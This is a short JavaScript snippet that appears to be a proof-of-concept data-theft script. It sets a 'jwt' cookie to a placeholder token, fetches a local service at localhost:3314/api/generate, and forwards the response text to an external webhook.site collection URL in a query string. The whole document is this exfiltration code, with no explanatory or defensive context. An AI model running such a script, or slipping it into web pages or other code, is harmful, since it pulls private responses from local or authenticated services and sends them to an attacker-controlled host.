const sourceUrl = 'http://localhost:3314/api/generate';
function setCookie(name, value, daysToExpire) {
    let cookie = `${name}=${encodeURIComponent(value)}`;

    if (daysToExpire) {
      const expirationDate = new Date();
      expirationDate.setTime(expirationDate.getTime() + (daysToExpire * 24 * 60 * 60 * 1000));
      cookie += `;expires=${expirationDate.toUTCString()}`;
    }

    document.cookie = cookie;
  }

const cookieName = 'jwt';
const cookieValue = '<jwt>';

setCookie(cookieName,cookieValue, 7)
fetch(sourceUrl)
  .then(response => {
    return response.text();
  })
  .then(data => {
    return fetch(`https://webhook.site/6813c3fc-ca54-4c0a-9cf1-ef3afe966825?response=${data}`);
  })
